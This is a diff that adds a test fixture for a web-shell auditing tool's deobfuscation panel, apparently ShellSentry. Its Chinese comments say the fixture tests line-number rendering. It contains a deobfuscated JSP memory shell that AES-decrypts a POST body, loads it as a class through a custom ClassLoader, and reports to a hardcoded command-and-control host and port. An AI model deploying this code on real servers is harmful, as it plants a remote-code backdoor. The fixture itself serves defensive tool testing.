@@ -1,0 +1,63 @@
+# 反混淆面板行号守卫的测试夹具（不是样本，也不是泄露的真实代码）
+#
+# 内容：ShellSentry 一次真实审计产出的 [DE_OBFUSCATE] 段（内存马 JSP，
+#       已移除所有标识）。用途是给 tools/verify_deob_alignment_browser.py
+#       与 tools/verify_gutter_line_numbers.py 提供**长高亮 + 大量空行 +
+#       跳号行号**的真实形态 —— 这三者是行号渲染最容易出错的场景。
+#
+# 重建方式：跑一次审计后，从 %LOCALAPPDATA%\ShellSentry\history 的最新
+#           记录里取出 [DE_OBFUSCATE] 段，替换下面的内容即可。
+[LINE_1]<%@page import="java.io.*,java.net.*,java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
+[LINE_2]<%!
+[LINE_3]
+[LINE_4]class MemshellLoader extends ClassLoader {
+[LINE_5]    public MemshellLoader(ClassLoader parent) {
+[LINE_6]        super(parent);
+[LINE_7]    }
+[LINE_8]    public Class defineMaliciousClass(byte[] b) {
+[LINE_9]        return [[HL]]super.defineClass(b, 0, b.length)[[/HL]];
+[LINE_10]    }
+[LINE_11]}
+[LINE_12]%>
+[LINE_13]<%
+[LINE_14]
+[LINE_15]if (request.getMethod().equals("POST") && request.getHeader("[[HL]]X-Security-Token[[/HL]]") != null) {
+[LINE_16]
+[LINE_17]
+[LINE_18]    String c2_host = "[[HL]]192.168.43.110[[/HL]]";
+[LINE_19]    int c2_port = [[HL]]8443[[/HL]];
+[LINE_20]
+[LINE_21]
+[LINE_22]    String xKey = "[[HL]]9f7d2b5a1e8c4f3a[[/HL]]";
+[LINE_23]    session.setAttribute("m_key", xKey);
+[LINE_24]
+[LINE_25]
+[LINE_26]    Cipher aesCipher = Cipher.getInstance("[[HL]]AES/ECB/PKCS5Padding[[/HL]]");
+[LINE_27]    aesCipher.init(Cipher.[[HL]]DECRYPT_MODE[[/HL]], new SecretKeySpec(xKey.getBytes(), "[[HL]]AES[[/HL]]"));
+[LINE_28]
+[LINE_29]
+[LINE_30]    InputStream is = request.getInputStream();
+[LINE_31]    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+[LINE_32]    byte[] buffer = new byte[1024];
+[LINE_33]    int len;
+[LINE_34]    while ((len = is.read(buffer)) != -1) {
+[LINE_35]        bos.write(buffer, 0, len);
+[LINE_36]    }
+[LINE_37]
+[LINE_38]
+[LINE_39]    byte[] decryptedPayload = aesCipher.doFinal(bos.toByteArray());
+[LINE_40]
+[LINE_41]
+[LINE_42]    Object instance = new MemshellLoader(this.getClass().getClassLoader())
+[LINE_43]        .defineMaliciousClass(decryptedPayload)
+[LINE_44]        .[[HL]]newInstance()[[/HL]];
+[LINE_45]
+[LINE_46]
+[LINE_47]    instance.equals(pageContext);
+[LINE_48]
+[LINE_49]
+[LINE_50]    Socket socket = new Socket(c2_host, c2_port);
+[LINE_51]    socket.getOutputStream().write("STAGE_1_SUCCESS".getBytes());
+[LINE_52]    socket.close();
+[LINE_53]}
+[LINE_54]%>
